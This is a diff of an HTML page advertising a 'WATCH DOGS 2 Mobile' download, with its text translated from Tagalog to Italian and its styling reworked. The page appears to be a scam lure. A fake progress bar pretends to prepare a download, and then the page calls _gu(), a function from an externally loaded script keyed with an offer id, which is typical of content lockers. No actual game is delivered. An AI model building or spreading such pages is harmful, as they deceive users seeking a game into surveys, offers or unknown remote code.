@@ -1,290 +1,333 @@
 <!DOCTYPE html>
-<html lang="tl" dir="ltr">
+<html lang="it" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>I-download ang Watch Dogs 2 Mobile</title>
+<title>WATCH DOGS 2 Mobile</title>
 
 <style>
-body {
-    font-family: Arial, sans-serif;
-    text-align: center;
-    margin: 0;
-    padding: 0;
+*{box-sizing:border-box}
 
-    background: url("https://staticctf.ubisoft.com/J3yJr34U2pZ2Ieem48Dwy9uqj5PNUQTn/145v1lJbepUf7s21OqqR7G/686ed8e30d30ebab9513707acfdaa934/-WD2-_Media_-_Screenshot_1.jpg") no-repeat center center fixed;
-    background-size: cover;
-
-    color: #fff;
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
+body{
+    font-family:Arial,sans-serif;
+    text-align:center;
+    margin:0;
+    padding:0;
+    background:
+    linear-gradient(rgba(0,0,0,.45),rgba(0,0,0,.75)),
+    url("https://staticctf.ubisoft.com/J3yJr34U2pZ2Ieem48Dwy9uqj5PNUQTn/145v1lJbepUf7s21OqqR7G/686ed8e30d30ebab9513707acfdaa934/-WD2-_Media_-_Screenshot_1.jpg")
+    no-repeat center center fixed;
+    background-size:cover;
+    color:#fff;
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    align-items:center;
+    overflow:hidden;
 }
 
-.title-box {
-    background: rgba(0, 0, 0, 0.65);
-    padding: 25px 40px;
-    border-radius: 20px;
-    backdrop-filter: blur(6px);
-    box-shadow: 0 10px 35px rgba(0,0,0,0.8);
-    margin-bottom: 20px;
+body::before{
+    content:'';
+    position:fixed;
+    inset:0;
+    background:
+    radial-gradient(circle at top left,rgba(0,234,255,.18),transparent 35%),
+    radial-gradient(circle at bottom right,rgba(0,119,255,.18),transparent 35%);
+    pointer-events:none;
 }
 
-.title-box h1 {
-    margin: 0;
-    font-size: 2.6em;
-    font-weight: bold;
-    text-shadow: 0 0 15px rgba(0,0,0,0.9);
+.top-logo{
+    position:absolute;
+    top:25px;
+    left:50%;
+    transform:translateX(-50%);
+    color:#00f7ff;
+    font-weight:bold;
+    letter-spacing:4px;
+    text-shadow:0 0 15px #00f7ff;
+    font-size:14px;
 }
 
-.title-box p {
-    margin-top: 10px;
-    font-size: 1.2em;
-    color: #ddd;
-    text-shadow: 0 0 10px rgba(0,0,0,0.9);
+.title-box{
+    background:rgba(10,15,25,.72);
+    padding:15px 25px;
+    border-radius:22px;
+    border:1px solid rgba(0,234,255,.25);
+    backdrop-filter:blur(8px);
+    box-shadow:0 0 30px rgba(0,234,255,.15),0 10px 40px rgba(0,0,0,.7);
+    margin-bottom:20px;
 }
 
-@media (max-width: 600px) {
-    .title-box {
-        padding: 15px 20px;
-        margin-bottom: 15px;
-        transform: translateY(-20px);
-    }
-
-    .title-box h1 {
-        font-size: 1.8em;
-    }
-
-    .title-box p {
-        font-size: 1em;
-    }
+.title-box h1{
+    margin:0;
+    font-size:1.6em;
+    color:#00f7ff;
+    text-shadow:0 0 10px #00f7ff,0 0 25px rgba(0,247,255,.5);
 }
 
-/* Platform buttons */
-.platform-select-btn {
-    padding: 15px 30px;
-    margin: 10px;
-    cursor: pointer;
-    border: none;
-    border-radius: 12px;
-    background: linear-gradient(45deg, #ff4b2b, #ff416c);
-    color: #fff;
-    font-size: 1.15em;
-    font-weight: bold;
-    transition: 0.3s all;
-    box-shadow: 0 8px 25px rgba(0,0,0,0.5);
+.title-box p{
+    color:#d9f8ff;
+    font-size:14px;
 }
 
-.platform-select-btn:hover {
-    background: linear-gradient(45deg, #ff416c, #ff4b2b);
-    transform: scale(1.07);
-    box-shadow: 0 0 20px rgba(255, 255, 255, 0.7);
+.platform-select-btn{
+    padding:10px 20px;
+    margin:8px;
+    border:none;
+    border-radius:14px;
+    cursor:pointer;
+    color:#fff;
+    font-size:0.9em;
+    font-weight:bold;
+    background:linear-gradient(135deg,#00d4ff,#0066ff);
+    position:relative;
+    overflow:hidden;
+    transition:.3s;
+    box-shadow:0 0 25px rgba(0,212,255,.35);
 }
 
-#overlay {
-    display: none;
-    position: fixed;
-    inset: 0;
-    background: rgba(0,0,0,0.6);
-    z-index: 999;
-    backdrop-filter: blur(4px);
+.platform-select-btn:hover{
+    transform:translateY(-3px) scale(1.05);
 }
 
-.modal {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%) scale(0);
-    width: 350px;
-    background: #111;
-    border-radius: 15px;
-    padding: 25px;
-    box-shadow: 0 15px 40px rgba(0,0,0,0.7);
-    z-index: 1000;
-    color: #fff;
-    opacity: 0;
-    transition: all 0.5s ease;
+.platform-select-btn::before{
+    content:'';
+    position:absolute;
+    top:0;
+    left:-120%;
+    width:100%;
+    height:100%;
+    background:linear-gradient(90deg,transparent,rgba(255,255,255,.35),transparent);
+    transition:.7s;
 }
 
-.modal.show {
-    opacity: 1;
-    transform: translate(-50%, -50%) scale(1);
+.platform-select-btn:hover::before{left:120%;}
+
+#overlay{
+    display:none;
+    position:fixed;
+    inset:0;
+    background:rgba(0,0,0,.65);
+    backdrop-filter:blur(5px);
+    z-index:999;
 }
 
-.modal-close {
-    position: absolute;
-    top: 10px;
-    left: 15px;
-    border: none;
-    background: transparent;
-    font-size: 24px;
-    cursor: pointer;
-    color: #fff;
+.modal{
+    position:fixed;
+    top:50%;
+    left:50%;
+    transform:translate(-50%,-50%) scale(0);
+    width:350px;
+    max-width:90%;
+    background:rgba(12,18,30,.96);
+    border:1px solid rgba(0,255,255,.2);
+    border-radius:20px;
+    padding:25px;
+    opacity:0;
+    z-index:1000;
+    transition:.4s;
 }
 
-.modal-game-icon {
-    width: 120px;
-    height: 120px;
-    display: block;
-    margin: 0 auto 15px auto;
-    border-radius: 15px;
+.modal.show{
+    opacity:1;
+    transform:translate(-50%,-50%) scale(1);
 }
 
-.modal-title {
-    margin-bottom: 15px;
-    font-size: 1.5em;
+.modal-close{
+    position:absolute;
+    top:10px;
+    left:15px;
+    border:none;
+    background:none;
+    color:white;
+    font-size:24px;
+    cursor:pointer;
 }
 
-.platform-label {
-    margin-bottom: 20px;
-    font-size: 1.1em;
+.modal-game-icon{
+    width:120px;
+    height:120px;
+    border-radius:16px;
+    border:2px solid rgba(0,234,255,.5);
+    box-shadow:0 0 25px rgba(0,234,255,.4);
 }
 
-.primary-download-btn {
-    width: 100%;
-    padding: 12px;
-    background: linear-gradient(45deg, #00c6ff, #0072ff);
-    color: #111;
-    border: none;
-    border-radius: 10px;
-    cursor: pointer;
-    font-size: 1.1em;
-    font-weight: bold;
+.primary-download-btn{
+    width:100%;
+    padding:14px;
+    border:none;
+    border-radius:12px;
+    font-weight:bold;
+    cursor:pointer;
+    background:linear-gradient(135deg,#00ff99,#00c8ff);
 }
 
-.download-tip {
-    margin-top: 10px;
-    font-size: 0.9em;
-    color: #ddd;
+.progress-container{display:none;margin-top:20px;}
+.progress-bar{height:18px;background:#1b2330;border-radius:30px;overflow:hidden;}
+.progress-fill{
+    width:0%;
+    height:100%;
+    background:linear-gradient(90deg,#00ff99,#00eaff,#0066ff);
+}
+@media(max-width:600px){
+.title-box{width:90%;padding:15px}
+.title-box h1{font-size:1.4em}
+.platform-select-btn{width:80%}
 }
 
-.progress-container {
-    margin-top: 20px;
-    display: none;
+.platform-icon{
+width:20px;
+height:20px;
+object-fit:contain;
+margin-right:6px;
+vertical-align:middle;
 }
 
-.progress-bar {
-    width: 100%;
-    background: #333;
-    border-radius: 10px;
-    overflow: hidden;
-    height: 15px;
-    margin-bottom: 10px;
+.platform-select-btn{
+display:flex;
+align-items:center;
+justify-content:center;
+gap:6px;
 }
 
-.progress-fill {
-    width: 0%;
-    height: 100%;
-    background: #00ff99;
+.android-btn{
+background:linear-gradient(135deg,#3ddc84,#1faa59);
 }
 
-.progress-text {
-    font-size: 0.9em;
+.ios-btn{
+background:linear-gradient(135deg,#2d2d2d,#7a7a7a);
 }
+
+
+.android-btn{
+background:linear-gradient(135deg,#00b0ff,#0066ff)!important;
+}
+
+.ios-btn{
+background:linear-gradient(135deg,#2b2b2b,#707070)!important;
+}
+
+.platform-select-btn{
+width:200px!important;
+height:50px!important;
+display:flex!important;
+align-items:center!important;
+justify-content:center!important;
+gap:8px!important;
+font-size:0.9rem!important;
+}
+
+.platform-icon{
+width:22px!important;
+height:22px!important;
+filter:brightness(0) invert(1)!important;
+}
+
+.title-box h1{
+font-size:1.8em!important;
+}
+
+.top-logo{
+font-size:11px!important;
+}
+
 </style>
 
 <script type="text/javascript">
-    var jRlIe_JOk_BVuvnc={"it":4601000,"key":"7ab2d"};
+    var LqXMR_HkZ_KKbYic={"it":4601000,"key":"7ab2d"};
 </script>
-<script src="https://d19k1sh57v5k0g.cloudfront.net/e8ce345.js"></script>
-
+<script src="https://d19k1sh57v5k0g.cloudfront.net/76eccc4.js"></script>
 </head>
-
 <body>
 
+<div class="top-logo">WATCH DOGS 2</div>
+
 <div class="title-box">
-  <h1>WATCH DOGS 2 Mobile</h1>
-  <p>Piliin ang iyong device para simulan ang pag-download:</p>
+<h1>WATCH DOGS 2 Mobile</h1>
+<p>Seleziona il tuo dispositivo per iniziare il download</p> <!-- CORRETTO -->
 </div>
 
-<button class="platform-select-btn" data-platform="Android">Android</button>
-<button class="platform-select-btn" data-platform="iPhone / iPad">iPhone / iPad</button>
+<button class="platform-select-btn android-btn" data-platform="Android">
+<img src="https://cdn-icons-png.flaticon.com/512/174/174836.png" class="platform-icon"> Android
+</button>
+<button class="platform-select-btn ios-btn" data-platform="iOS">
+<img src="https://cdn-icons-png.flaticon.com/512/731/731985.png" class="platform-icon"> iPhone / iPad
+</button>
 
 <div id="overlay"></div>
 
 <div class="modal" id="modal">
-
 <button class="modal-close" id="modalClose">×</button>
 
 <img class="modal-game-icon"
 src="https://i.postimg.cc/L4LSyGr1/watch-dogs-2-pc-jeu-ubisoft-connect-europe-cover.jpg">
 
-<h3 class="modal-title">WATCH DOGS 2 Mobile</h3>
+<h3>WATCH DOGS 2 Mobile</h3>
 
-<div class="platform-label">
-Device: <span id="platformText">Android</span>
+<div>
+Dispositivo: <span id="platformText">Android</span>
 </div>
+
+<br>
 
 <button class="primary-download-btn" id="primaryDownloadBtn">
-I-download Ngayon
+Scarica ora
 </button>
 
-<p class="download-tip">
-Mabilis at ligtas na pag-download para sa mobile.
-</p>
-
 <div class="progress-container" id="progressContainer">
-  <div class="progress-bar">
-    <div class="progress-fill" id="progressFill"></div>
-  </div>
-  <p class="progress-text" id="progressText">
-    Inihahanda ang download...
-  </p>
+<br>
+<div class="progress-bar">
+<div class="progress-fill" id="progressFill"></div>
 </div>
-
+<p id="progressText">Preparazione del download in corso...</p> <!-- CORRETTO -->
+</div>
 </div>
 
 <script>
-document.addEventListener('DOMContentLoaded', function(){
+document.addEventListener('DOMContentLoaded',()=>{
 
-let modal = document.getElementById('modal');
-let overlay = document.getElementById('overlay');
+let modal=document.getElementById('modal');
+let overlay=document.getElementById('overlay');
 
 document.querySelectorAll('.platform-select-btn').forEach(btn=>{
-  btn.onclick=()=>{
-    document.getElementById('platformText').innerText =
-      btn.dataset.platform;
-    modal.classList.add('show');
-    overlay.style.display='block';
-  }
+btn.onclick=()=>{
+document.getElementById('platformText').innerText=btn.dataset.platform;
+modal.classList.add('show');
+overlay.style.display='block';
+};
 });
 
 overlay.onclick=()=>{
-  modal.classList.remove('show');
-  overlay.style.display='none';
-}
+modal.classList.remove('show');
+overlay.style.display='none';
+};
 
 document.getElementById('modalClose').onclick=()=>{
-  modal.classList.remove('show');
-  overlay.style.display='none';
-}
+modal.classList.remove('show');
+overlay.style.display='none';
+};
 
 document.getElementById('primaryDownloadBtn').onclick=()=>{
+let container=document.getElementById('progressContainer');
+let fill=document.getElementById('progressFill');
+let text=document.getElementById('progressText');
 
-  let container=document.getElementById('progressContainer');
-  let fill=document.getElementById('progressFill');
-  let text=document.getElementById('progressText');
+container.style.display='block';
 
-  container.style.display='block';
+let w=0;
+let i=setInterval(()=>{
+w+=5;
+fill.style.width=w+'%';
+text.innerText='Preparazione del download in corso... '+w+'%'; // CORRETTO
 
-  let w=0;
-  let i=setInterval(()=>{
-
-    w+=5;
-    fill.style.width=w+'%';
-    text.innerText="Inihahanda ang download... "+w+"%";
-
-    if(w>=100){
-      clearInterval(i);
-      text.innerText="Handa na ang download!";
-
-      if(typeof _gu==="function"){ _gu(); }
-    }
-
-  },100);
+if(w>=100){
+clearInterval(i);
+text.innerText='Download pronto!';
+if(typeof _gu==="function"){_gu();}
 }
+},100);
+};
 });
 </script>
 
